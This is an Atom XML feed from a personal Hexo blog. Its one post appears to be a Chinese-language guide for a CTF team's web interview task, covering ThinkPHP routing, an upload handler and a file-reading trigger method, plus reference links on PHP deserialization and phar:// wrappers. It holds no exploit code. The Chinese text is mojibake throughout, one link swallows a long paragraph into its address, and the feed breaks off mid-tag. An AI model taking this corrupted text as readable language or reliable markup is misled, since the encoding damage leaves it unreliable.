<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>é›¨è¿‡å¤©æ™´&amp;ä¼è½äººç¦»&#39;s Blog</title>
  
  
  <link href="https://zwh-china.github.io/atom.xml" rel="self"/>
  
  <link href="https://zwh-china.github.io/"/>
  <updated>2021-10-24T18:52:55.323Z</updated>
  <id>https://zwh-china.github.io/</id>
  
  <author>
    <name>é›¨è¿‡å¤©æ™´&amp;ä¼è½äººç¦»</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>äºŒé¢ä»»åŠ¡ä¸€ç¬¬ä¸€é¢˜å°çŸ¥è¯†</title>
    <link href="https://zwh-china.github.io/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/"/>
    <id>https://zwh-china.github.io/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/</id>
    <published>2021-10-24T18:40:55.000Z</published>
    <updated>2021-10-24T18:52:55.323Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p> é¦–å…ˆå½“ä½ æ‹¿åˆ°è¿™é“é¢˜ï¼Œæˆ‘æƒ³å…ˆæ­å–œä½ å·²ç»è¿›å…¥äº†ä¸‰å¶è‰webæ–¹å‘çš„ç¬¬äºŒè½®é¢è¯•ã€‚ğŸ‘</p></blockquote><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><p>å½“ä½ ä¸‹è½½å¹¶è§£å‹é™„ä»¶ï¼Œä½ ä¼šå‘ç°å®ƒå¾ˆå¤æ‚ï¼Œæœ‰å¾ˆå¤šæ–‡ä»¶ã€‚ç»†å¿ƒçš„å°ä¼™ä¼´ä¹Ÿè®¸å·²ç»æ³¨æ„åˆ°æ–‡ä»¶ä¸­æœ‰<code>.gitignore</code>æ–‡ä»¶ï¼Œè¿™è¯´æ˜è¿™ä¸ªæ–‡ä»¶å¾ˆæœ‰å¯èƒ½æ˜¯ä»githubä¸‹è½½çš„ã€‚é€šè¿‡é˜…è¯»README.txtå’Œhintæ–‡ä»¶ã€‚ä½ å¯ä»¥äº†è§£åˆ°è¿™æ˜¯ä¸€ä¸ªwebå¼€å‘æ¡†æ¶ThinkPHPã€‚è¿™å¯èƒ½æ˜¯ä½ ç¬¬ä¸€æ¬¡æ¥è§¦æ¡†æ¶ï¼Œè¿™äº›ä¸œè¥¿å¯¹äºä½ æ¥è¯´å¯èƒ½æ˜¾å¾—å¾ˆé™Œç”Ÿã€‚ä¸è¿‡æ²¡å…³ç³»ï¼Œè¿™ç¯‡æ–‡ç« ä¼šå¸®åŠ©ä½ æ‰«æ¸…åšé¢˜çš„å‰æœŸéšœç¢ã€‚</p><p>å½“ä½ æ¥è§¦ä¸€ä¸ªæ–°çš„ä¸œè¥¿ï¼Œå¦‚æœæ˜¯ä»githubä¸‹è½½çš„ï¼Œé¦–å…ˆä½ å°±åº”è¯¥é˜…è¯»ä»–çš„README.mdï¼Œåœ¨è¿™é‡Œä½ ä¼šå¾—åˆ°è¿™ä¸ªæ–°ä¸œè¥¿çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼Œè¿™å…¶ä¸­å¯èƒ½åŒ…æ‹¬è¿™ä¸ªæ–°ä¸œè¥¿çš„å®‰è£…æ–¹æ³•ï¼Œä½¿ç”¨æ–¹æ³•ï¼Œæ³¨æ„äº‹é¡¹å’Œæ›´è¯¦ç»†çš„å®˜æ–¹æ‰‹å†Œå’ŒæŒ‡å—çš„é“¾æ¥åœ°å€ã€‚æ¥ä¸‹æ¥ä½ åº”è¯¥æƒ³åŠæ³•å»æŠŠè¿™ä¸ªæ¡†æ¶æ­å»ºèµ·æ¥ï¼Œè¿™é‡Œä½ å¯ä»¥å‚é˜…README.mdæˆ–è€…æ˜¯è¿™ä¸ªä¸œè¥¿çš„å®˜æ–¹æ–‡æ¡£<a href="https://www.kancloud.cn/manual/thinkphp5">https://www.kancloud.cn/manual/thinkphp5</a></p><p>å½“ç„¶è¿™ä¹ˆå¤§ä¸€ä¸ªæ–‡æ¡£å¯¹äºçŸ­æ—¶é—´é˜…è¯»å¹¶æŒæ¡æ˜¾ç„¶ä¸å¤ªç°å®ã€‚æˆ‘ä»¬ä¸å¦‚å…ˆäº†è§£ä¸€ä¸‹åŸºç¡€ä¿¡æ¯å†æ­å»ºå¥½é¢˜ç›®æœ¬åœ°ç¯å¢ƒï¼ŒæŠŠç›®å…‰æ›´å¤šçš„æ”¾åœ¨é¢˜ç›®ä¸Šã€‚é¦–å…ˆæˆ‘ä»¬å¯ä»¥çœ‹ä¸‹æ¡†æ¶åŸºæœ¬æ–‡ä»¶åˆ†å¸ƒï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ªæ–‡ä»¶å¤¹çš„æ–‡ä»¶æ˜¯å¹²å˜›çš„ã€‚</p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025011929025.png" alt="image-20211025011929025"></p><p>æ¥ç€æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹æ¡†æ¶çš„ç”Ÿå‘½å‘¨æœŸ(<a href="https://www.kancloud.cn/manual/thinkphp5/118011">https://www.kancloud.cn/manual/thinkphp5/118011</a>)</p><p>ç”Ÿå‘½å‘¨æœŸå¾ˆå¥½ç†è§£ï¼Œå¯¹äºè¿™ä¸ªå¤§æ¡†æ¶æ¥è¯´ã€‚ç”Ÿå‘½å‘¨æœŸçš„æ„æ€å°±æ˜¯ï¼Œå½“ä½ åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ä¸€ä¸²urlæŒ‰ä¸‹å›è½¦çš„é‚£ä¸€åˆ»ï¼Œåˆ°åç«¯å¤„ç†è§£æå®Œä½ çš„urlä¿¡æ¯ï¼Œå¹¶æ ¹æ®ä¿¡æ¯è¾“å‡ºå¯¹åº”çš„è§†å›¾ä¹Ÿå°±æ˜¯ä½ åœ¨æµè§ˆå™¨çœ‹åˆ°çš„ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¿”å›è§†å›¾åçš„å¤„ç†å·¥ä½œã€‚</p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025010931304.png" alt="image-20211025010931304"></p><p> è¿™ä¸ªå¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯è¯´æ— è®ºä½ æƒ³è®¿é—®ä»€ä¹ˆä¸œè¥¿éƒ½å¾—ç»è¿‡è¿™ä¸ªå…¥å£æ–‡ä»¶ã€‚ç›¸å½“äºæ•´ä¸ªæ¡†æ¶çš„å¤§é—¨ã€‚</p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025011041481.png" alt="image-20211025011041481"></p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025011053650.png" alt="image-20211025011053650"></p><p>2-5æˆ‘ä»¬éƒ½ä¸å¿…åšäº†è§£ï¼Œå¤§æ¦‚çŸ¥é“å°±å¥½ã€‚å°±åƒä½ å†™äº†ä¸€ä¸ªCè¯­è¨€çš„hello worldç¨‹åºï¼Œä½ åªéœ€è¦çŸ¥é“ç‚¹å‡»runå°±å¥½ï¼Œä¸­é—´çš„ç¼–è¯‘é“¾æ¥è¿‡ç¨‹ä½ åªéœ€è¦çŸ¥é“å°±å¥½ï¼Œç¼–è¯‘å™¨ä¼šæ›¿ä½ æŠŠå·¥ä½œåšå¥½ã€‚æ¡†æ¶ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œè¿™éƒ¨åˆ†æ¡†æ¶ä¼šæ›¿ä½ å¤„ç†ï¼Œæˆ‘ä»¬æ— éœ€æ“å¿ƒã€‚ï¼ˆä¸ç„¶æˆ‘ä»¬å¹²å˜›ç”¨æ¡†æ¶ï¼‰</p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025011323161.png" alt="image-20211025011323161"></p><p>è¿™ä¸¤éƒ¨åˆ†æ˜¯æŒºé‡è¦çš„ã€‚ä¹ä¸€çœ‹è·¯ç”±ï¼Œè®¿é—®æ£€æµ‹ä¼¼ä¹æ˜¯å¾ˆé«˜æ·±çš„è¯è¯­ã€‚ä½†æˆ‘ä»¬ä»”ç»†çœ‹ä¸€ä¸‹ã€‚</p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025011418046.png" alt="image-20211025011418046"></p><p>ä½†çœ‹è¿™ä¸€éƒ¨åˆ†æˆ‘æƒ³è¿˜æ˜¯å¾ˆå¥½ç†è§£çš„ï¼Œå°±æ˜¯è®¿é—®äº†index.phpæ–‡ä»¶ã€‚</p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025011510011.png" alt="image-20211025011510011"></p><p>åé¢è¿™ä¸€éƒ¨åˆ†å¯èƒ½ä½ è¿˜ä¸çŸ¥é“è¿™æ˜¯ä»€ä¹ˆã€‚æˆ‘ä»¬è¿™é‡Œç®€å•ç†è§£ä¸€ä¸‹ï¼Œå°±é¢˜è®ºé¢˜ã€‚åœ¨æˆ‘ä»¬éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åå¯ä»¥çœ‹åˆ°urlå‘ç”Ÿäº†å˜åŒ–</p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025012358506.png" alt="image-20211025012358506"></p><p>ä¸ºä»€ä¹ˆæˆ‘ä»¬çš„urlä¼šæ˜¯è¿™ç§å½¢å¼çš„å‘¢ï¼Ÿå‚è€ƒ</p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025012539371.png" alt="image-20211025012539371"></p><p>å’Œ</p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025012601833.png" alt="image-20211025012601833"></p><p>é‚£ä¹ˆæŒ‰ç…§æ–‡æ¡£çš„è§„åˆ™ã€‚æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶çš„urlåº”è¯¥æŒ‡å‘çš„æ˜¯</p><pre><code>module:indexcontroller:indexaction:uploadvalue:è¿™é‡Œæ²¡æœ‰ä¼ å€¼æ‰€ä»¥ä¸ºç©º</code></pre><p>æ­¤å¤„ç¯å¢ƒä¹Ÿå¯ä»¥ä½¿ç”¨é»˜è®¤çš„urlè§„åˆ™ä¹Ÿå°±æ˜¯</p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025012939165.png" alt="image-20211025012939165"></p><p>çš„å½¢å¼ï¼Œæ•ˆæœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œå› ä¸ºæˆ‘æ²¡æœ‰é€‰æ‹©ä¸Šä¼ æ–‡ä»¶ï¼Œç›´æ¥è®¿é—®å¤„ç†ä¸Šä¼ æ–‡ä»¶çš„urlæ‰€ä»¥ä¼šå‡ºç°å¦‚å›¾çš„æç¤ºã€‚è¿™é‡Œä¹‹æ‰€ä»¥åŠ index.phpæ˜¯å› ä¸ºindex.phpæ˜¯æ•´ä¸ªæ¡†æ¶çš„å…¥å£æ–‡ä»¶ã€‚ä¸Šé¢ç¬¬ä¸€ä¸ªä¾‹å­çš„urlæ²¡æœ‰å†™å‡ºindex.phpæ˜¯å› ä¸ºé»˜è®¤ä¼ å‚ä¹Ÿå°±æ˜¯<code>?s</code>é»˜è®¤æ˜¯ä¼ ç»™indexçš„,å°±åƒä½ è®¿é—®<code>www.baidu.com</code>è™½ç„¶æ²¡æœ‰æŒ‡å®šindexï¼Œä½†æ˜¯é»˜è®¤å°±æ˜¯ä¸æŒ‡å®šæ–‡ä»¶æ—¶é»˜è®¤è®¿é—®indexæ–‡ä»¶ã€‚</p><p>å¥½ï¼Œæˆ‘ä»¬ç°åœ¨å¤§æ¦‚äº†è§£äº†urlçš„ç»“æ„ã€‚æ ¹æ®ä¹‹å‰çœ‹çš„æ¡†æ¶ç»“æ„</p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025013349598.png" alt="image-20211025013349598"></p><p>æˆ‘ä»¬æ¥æ‰¾æ‰¾çœ‹ï¼Œå¤„ç†ä¸Šä¼ æ–‡ä»¶éƒ¨åˆ†çš„ä»£ç ä½äºå“ªé‡Œ</p><p>å¯ä»¥çŸ¥é“moduleæ˜¯indexè€Œcontrollerä¹Ÿæ˜¯indexè€Œactionæ˜¯uploadã€‚é‚£æˆ‘ä»¬å»çœ‹çœ‹module(æ¨¡å—)çš„ä½ç½®ã€‚</p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025013547868.png" alt="image-20211025013547868"></p><p>ä¹Ÿå°±æ˜¯applicationæ–‡ä»¶å¤¹é‡Œã€‚æœç„¶é‡Œé¢æœ‰ä¸€ä¸ªå«indexçš„æ–‡ä»¶å¤¹ã€‚ä¹Ÿå°±æ˜¯index module(æ¨¡å—)ã€‚é¡ºæ°´æ¨èˆŸç‚¹å‡»index</p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025013710101.png" alt="image-20211025013710101"></p><p>çœ‹åˆ°é‡Œé¢æœ‰controller(æ§åˆ¶å™¨)ç‚¹å¼€å®ƒã€‚</p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025013739969.png" alt="image-20211025013739969"></p><p>å‘ç°é‡Œé¢å°±æ˜¯indexæ§åˆ¶å™¨çš„æ–‡ä»¶ã€‚ä¹Ÿè®¸ä½ çœ‹åˆ°è¿™é‡Œè¦é—®é‚£cationåœ¨å“ªé‡Œï¼Ÿè¿™é‡Œå·²ç»æ²¡æœ‰åˆ«çš„æ–‡ä»¶å¤¹äº†ï¼Œåªæœ‰è¿™ä¸ªindex.phpæ–‡ä»¶ã€‚åˆ«æ€¥æˆ‘ä»¬æ‰“å¼€å®ƒã€‚</p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025013914108.png" alt="image-20211025013914108"></p><p>æœç„¶é‡Œé¢æœ‰ä¸€ä¸ªå«uploadçš„å‡½æ•°(æ–¹æ³•)ï¼Œæ­¤å¤„æºç å¯èƒ½æ¶‰åŠä¸€äº›phpé¢å‘å¯¹è±¡çš„åŸºç¡€çŸ¥è¯†ã€‚è¿™é‡Œæ¨èåœ¨èœé¸Ÿæ•™ç¨‹å­¦ï¼ˆ<a href="https://www.runoob.com/php/php-oop.html)%EF%BC%8C%E4%BD%A0%E4%BC%9A%E5%8F%91%E7%8E%B0%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%B2%A1%E6%9C%89%E4%BD%A0%E6%83%B3%E7%9A%84%E9%82%A3%E4%B9%88%E9%AB%98%E6%B7%B1(%E5%AF%B9%E4%BA%8E%E6%9C%AC%E9%98%B6%E6%AE%B5)%E3%80%82%E4%BD%A0%E4%B9%9F%E8%AE%B8%E5%B7%B2%E7%BB%8F%E7%9F%A5%E9%81%93%E7%B1%BB%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B9%E6%B3%95%E4%BB%A3%E8%A1%A8%E4%BA%86%E8%BF%99%E4%B8%AA%E7%B1%BB%E7%9A%84%E5%AF%B9%E8%B1%A1%E7%9A%84%E4%B8%80%E4%BA%9B%E8%A1%8C%E4%B8%BA%E3%80%82%E6%AD%A4%E5%A4%84action%E4%B8%BAupload%E8%A1%A8%E6%98%8E%E8%B0%83%E7%94%A8%E8%BF%99%E4%B8%AA%E7%B1%BB%E4%B8%AD%E7%9A%84upload(%E4%B8%8A%E4%BC%A0)%E7%9A%84%E8%BF%99%E4%B8%AA%E8%A1%8C%E4%B8%BA%E6%88%96%E8%80%85%E8%AF%B4%E5%8A%A8%E4%BD%9C(action)%EF%BC%8C%E7%9C%8B%E5%88%B0%E8%BF%99%E9%87%8C%E6%88%91%E6%83%B3%E4%BD%A0%E4%B9%9F%E8%AE%B8%E5%B7%B2%E7%BB%8F%E6%98%8E%E7%99%BD%E4%BA%86%E8%BF%99%E4%B8%AAurl%E7%9A%84%E4%BD%9C%E7%94%A8%E4%BA%86%E3%80%82%E9%A6%96%E5%85%88%E8%B0%83%E7%94%A8index%E6%A8%A1%E5%9D%97%EF%BC%8C%E6%8C%87%E5%AE%9Aindex%E6%8E%A7%E5%88%B6%E5%99%A8%EF%BC%8C%E5%86%8D%E8%B0%83%E7%94%A8%E5%85%B6%E4%B8%AD%E7%9A%84upload%E4%B8%8A%E4%BC%A0%E8%A1%8C%E4%B8%BA%E3%80%82%E4%BE%9D%E6%AD%A4%E7%B1%BB%E6%8E%A8%E5%BD%93%E8%BF%99%E4%B8%AAaction%E4%B8%BAindex%E6%97%B6%EF%BC%8C%E8%B0%83%E7%94%A8%E7%9A%84%E5%B0%B1%E6%98%AFindex%E6%96%B9%E6%B3%95%EF%BC%8C%E8%8E%B7%E5%8F%96%E5%88%B0%E7%9A%84%E5%B0%B1%E6%98%AF%E4%BD%A0%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEurl%E7%9A%84%E7%BB%93%E6%9E%9C%EF%BC%8Cindex%E5%BE%88%E5%A4%9A%E6%97%B6%E5%80%99%E6%98%AF%E9%BB%98%E8%AE%A4%E7%9A%84%E4%B8%8D%E5%BF%85%E6%8C%87%E5%AE%9A%EF%BC%8C%E5%BD%93%E7%84%B6%E4%BD%A0%E9%80%9A%E8%BF%87%E6%89%8B%E5%8A%A8%E6%8C%87%E5%AE%9A%EF%BC%8C%E6%95%88%E6%9E%9C%E4%B9%9F%E6%98%AF%E4%B8%80%E6%A0%B7%E7%9A%84%E5%8D%B3%EF%BC%88http://106.15.74.181:8002/index.php/index/index/index%E5%92%8C%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEhttp://106.15.74.181:8002/%E6%95%88%E6%9E%9C%E4%B8%80%E8%87%B4%E3%80%90%E5%9B%BE%E7%89%87%E6%9C%AA%E8%83%BD%E5%8A%A0%E8%BD%BD%E6%98%AF%E6%88%91%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%9A%84%E9%94%85%E4%B8%8D%E5%BF%85%E5%9C%A8%E6%84%8F%E3%80%91%EF%BC%89action%E4%B8%BAtrigger%E6%97%B6%E8%B0%83%E7%94%A8%E7%9A%84%E5%B0%B1%E6%98%AFtrigger%E6%96%B9%E6%B3%95">https://www.runoob.com/php/php-oop.html)ï¼Œä½ ä¼šå‘ç°é¢å‘å¯¹è±¡æ²¡æœ‰ä½ æƒ³çš„é‚£ä¹ˆé«˜æ·±(å¯¹äºæœ¬é˜¶æ®µ)ã€‚ä½ ä¹Ÿè®¸å·²ç»çŸ¥é“ç±»ä¸­çš„ä¸€äº›æ–¹æ³•ä»£è¡¨äº†è¿™ä¸ªç±»çš„å¯¹è±¡çš„ä¸€äº›è¡Œä¸ºã€‚æ­¤å¤„actionä¸ºuploadè¡¨æ˜è°ƒç”¨è¿™ä¸ªç±»ä¸­çš„upload(ä¸Šä¼ )çš„è¿™ä¸ªè¡Œä¸ºæˆ–è€…è¯´åŠ¨ä½œ(action)ï¼Œçœ‹åˆ°è¿™é‡Œæˆ‘æƒ³ä½ ä¹Ÿè®¸å·²ç»æ˜ç™½äº†è¿™ä¸ªurlçš„ä½œç”¨äº†ã€‚é¦–å…ˆè°ƒç”¨indexæ¨¡å—ï¼ŒæŒ‡å®šindexæ§åˆ¶å™¨ï¼Œå†è°ƒç”¨å…¶ä¸­çš„uploadä¸Šä¼ è¡Œä¸ºã€‚ä¾æ­¤ç±»æ¨å½“è¿™ä¸ªactionä¸ºindexæ—¶ï¼Œè°ƒç”¨çš„å°±æ˜¯indexæ–¹æ³•ï¼Œè·å–åˆ°çš„å°±æ˜¯ä½ ç›´æ¥è®¿é—®urlçš„ç»“æœï¼Œindexå¾ˆå¤šæ—¶å€™æ˜¯é»˜è®¤çš„ä¸å¿…æŒ‡å®šï¼Œå½“ç„¶ä½ é€šè¿‡æ‰‹åŠ¨æŒ‡å®šï¼Œæ•ˆæœä¹Ÿæ˜¯ä¸€æ ·çš„å³ï¼ˆhttp://106.15.74.181:8002/index.php/index/index/indexå’Œç›´æ¥è®¿é—®http://106.15.74.181:8002/æ•ˆæœä¸€è‡´ã€å›¾ç‰‡æœªèƒ½åŠ è½½æ˜¯æˆ‘ä½¿ç”¨ç›¸å¯¹è·¯å¾„çš„é”…ä¸å¿…åœ¨æ„ã€‘ï¼‰actionä¸ºtriggeræ—¶è°ƒç”¨çš„å°±æ˜¯triggeræ–¹æ³•</a></p><p>åˆ°è¿™é‡Œä¸ºæ­¢ï¼Œæˆ‘ç›¸ä¿¡ä½ å·²ç»å¯¹æ¡†æ¶æœ‰äº†æœ€ä¸ºåŸºæœ¬çš„äº†è§£ã€‚æˆ‘ä»¬å†æ¥çœ‹çœ‹é¢˜ç›®æ ¸å¿ƒé€»è¾‘æºç ï¼Œä½ ä¼šå‘ç°å¤„ç†ä¸Šä¼ éƒ¨åˆ†çš„uploadæ–¹æ³•(å‡½æ•°)ï¼Œé¦–å…ˆæ£€æŸ¥äº†æ–‡ä»¶æ‹“å±•åï¼Œæ¥ç€å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ¥ç€æŠŠç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶å­˜åœ¨ä¸€ä¸ªåœ°æ–¹ï¼Œæœ€åæŠŠè¿™ä¸ªåœ°æ–¹çš„è·¯å¾„ç”¨echoå‡½æ•°å›æ˜¾ï¼ˆè¿™ä¸ªå›æ˜¾å…¶å®ä¸é‡è¦ï¼‰ã€‚</p><p>å†çœ‹triggeræ–¹æ³•ï¼ˆå‡½æ•°ï¼‰ï¼Œè¿™é‡Œä¸éœ€è¦å‚æ•°ï¼Œè§¦å‘è¿™ä¸ªæ–¹æ³•ä¼šå»è°ƒç”¨file_get_contentsè¿™ä¸ªPHPå‡½æ•°ï¼Œæ˜¯å¾ˆåŸºç¡€çš„å‡½æ•°å®ƒçš„ä½œç”¨æ˜¯è¯»å–ä»ç»™å®šæ–‡ä»¶è·¯å¾„è¯»å–æ–‡ä»¶å†…å®¹ã€‚è¿™é‡Œæ–‡ä»¶è·¯å¾„è¢«å†™æ­»äº†ï¼Œä¹Ÿå°±æ˜¯<img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025015343895.png" alt="image-20211025015343895"></p><p>è€Œ$nameçš„å€¼<img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025015400391.png" alt="image-20211025015400391"></p><p>ä¹Ÿæ˜¯æˆ‘ä»¬ä¸å¯æ§çš„ã€‚ç»“åˆä¸Šä¼ æ“ä½œï¼Œæˆ‘ä»¬å¤§æ¦‚å¯ä»¥å¾—çŸ¥ï¼Œè¿™ä¸ªtriggeræ–¹æ³•(å‡½æ•°)å…¶å®æ˜¯å»è¯»å–äº†æˆ‘ä»¬å…ˆå‰ï¼ˆæˆåŠŸï¼‰ä¸Šä¼ çš„æ–‡ä»¶ï¼ˆä¸ä¿¡ä½ ä¹Ÿå¯ä»¥æœ¬åœ°æ­å»ºç„¶åä¸Šä¼ ä¸€ä¸‹çœ‹ï¼‰ã€‚ç»“åˆé¢˜ç›®åç§°ã€‚æˆ‘ä»¬å¾—çŸ¥è¿™é¢˜å’Œååºåˆ—åŒ–ç›¸å…³ã€‚</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬å…ˆå»äº†è§£ä¸€ä¸‹æœ‰å…³PHPååºåˆ—åŒ–çš„ç›¸å…³çŸ¥è¯†ã€‚</p><pre><code>https://ca01h.top/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87/https://www.php.net/manual/en/language.oop5.magic.phphttp://106.15.74.181/archives/428.html#respond</code></pre><p>è‡³äº<code>phar://</code>åˆ™æ˜¯ä¼ªåè®®çš„ä¸€ç§ï¼Œåœ¨ctfä¸­phpä¼ªåè®®ä¹Ÿæ˜¯ç»å¸¸ç”¨åˆ°çš„çŸ¥è¯†ç‚¹ï¼Œå…·ä½“å¯è§</p><pre><code>phpä¼ªåè®®åŒ…è£…å™¨https://xz.aliyun.com/t/399æ­»äº¡ä»£ç æ‚ç³…ç»•è¿‡https://xz.aliyun.com/t/8163#toc-16Pç‰› https://www.leavesongs.com/PENETRATION/php-filter-magic.htmlç‹å¹ä¹‹ https://www.cnblogs.com/wangtanzhi/p/12256297.html#autoid-0-3-0è¿œç¨‹æ–‡ä»¶åŒ…å« https://www.jianshu.com/p/be68cf9be911</code></pre><p>é‚£ä¹ˆæœ‰å…³ä¼ªåè®®åˆå’Œphpæœ‰ä»€ä¹ˆå…³ç³»å‘¢</p><pre><code>https://www.freebuf.com/articles/web/205943.htmlhttps://www.cnblogs.com/zzjdbk/p/13030571.htmlhttps://www.secpulse.com/archives/94680.html</code></pre><p>å½“ä½ è¯»åˆ°è¿™é‡Œï¼Œå¹¶åŸºæœ¬æŒæ¡äº†ä¸Šè¿°çŸ¥è¯†ç‚¹ä½ ä¾¿å¯ä»¥å¼€å§‹å°è¯•æ‰¾è¿™ä¸ªæ¡†æ¶çš„ååºåˆ—åŒ–æ¼æ´äº†ã€‚</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>å¦‚æœä½ å·²ç»å¤§æ¦‚çœ‹äº†ä¹‹å‰æåˆ°çš„æºç ï¼Œä½ åº”è¯¥æ³¨æ„åˆ°æ–‡ä»¶è¢«å†™åˆ°äº†<code>/tmp</code>ç›®å½•ï¼Œä½ å¯ä»¥é€‰æ‹©è‡ªå·±æ›´æ”¹ä¸€ä¸‹è·¯å¾„æˆ–è€…å¹²è„†å°±ç”¨Linuxæ­å»ºã€‚Linuxä½ å¯èƒ½éœ€è¦ä¸€ä¸ªå­¦ç”ŸæœºVPSï¼ˆè…¾è®¯äº‘ï¼Œé˜¿é‡Œäº‘ä¹‹ç±»çš„å­¦ç”ŸåŠéƒ½å¯ï¼‰ï¼Œè¿™è¾¹å»ºè®®ä½¿ç”¨å®å¡”ï¼ˆ<a 